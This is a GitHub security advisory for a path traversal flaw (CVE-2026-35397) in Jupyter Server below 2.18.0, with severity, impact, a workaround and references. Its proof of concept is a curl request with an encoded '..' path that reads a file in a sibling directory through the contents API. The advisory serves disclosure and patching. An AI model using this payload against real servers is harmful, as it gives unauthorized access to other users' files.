# [H] Jupyter Server: Path Traversal via incorrect startswith() root directory check allows access to sibling directories

## Summary
Severity: High
Advisory: GHSA-5789-5fc7-67v3
CVE: CVE-2026-35397
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-5789-5fc7-67v3
Type: github-advisory

## Affected
- PyPI: `jupyter-server` — affected >=0 <2.18.0

## Details
### Summary

Jupyter Server <=2.17.0 can access directories sibling to the root directory, if it starts with the root dir's name.

### PoC

Minimal:

```
.
├── test/              <- root directory.
│   └── test.txt
└── testtest/
    └── secret.txt     <- file to exfiltrate that we should not be able to access via API
```

```bash
HOST="http://localhost:8888"
TOKEN=""
SIBLING="testtest"
TARGET="secret.txt"

curl -s -X POST \
  "$HOST/api/contents/%2e%2e/$SIBLING/$TARGET/checkpoints" \
  -H "Authorization: token $TOKEN"
```

Full PoC by @stef41: https://gist.github.com/Yann-P/66d4982a965dee8fcb8dd89db29e7006

### Impact

It is possible for an authenticated user to access content outside the server's `root_dir` in siblings directories sharing the same prefix as the `root_dir`. The attacker can escalate access, reading, writing, and deleting from sibling directories.

This can have a tangible impact for deployments using predictable naming scheme with multi-tenant server, for example `user1`, `user2`, `user3`, ..., `user10` etc, as `user1` could access and modify files of all `user10` - `user19` and higher.

In a hypothetical system where users can choose a name of their folder, an attacker could choose a single-letter username to gain access to a significant number of sibling directories.

### Workarounds

Use folder names that do not overlap.

### Acknowledgments

Thank you to @stef41 for providing a useful PoC.

## References
- https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-5789-5fc7-67v3
- https://nvd.nist.gov/vuln/detail/CVE-2026-35397
- https://access.redhat.com/errata/RHSA-2026:43038
- https://access.redhat.com/errata/RHSA-2026:60520
- https://access.redhat.com/security/cve/CVE-2026-35397
- https://bugzilla.redhat.com/show_bug.cgi?id=2466858
- https://github.com/jupyter-server/jupyter_server
- https://github.com/pypa/advisory-database/tree/main/vulns/jupyter-server/PYSEC-2026-68.yaml
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-35397.json
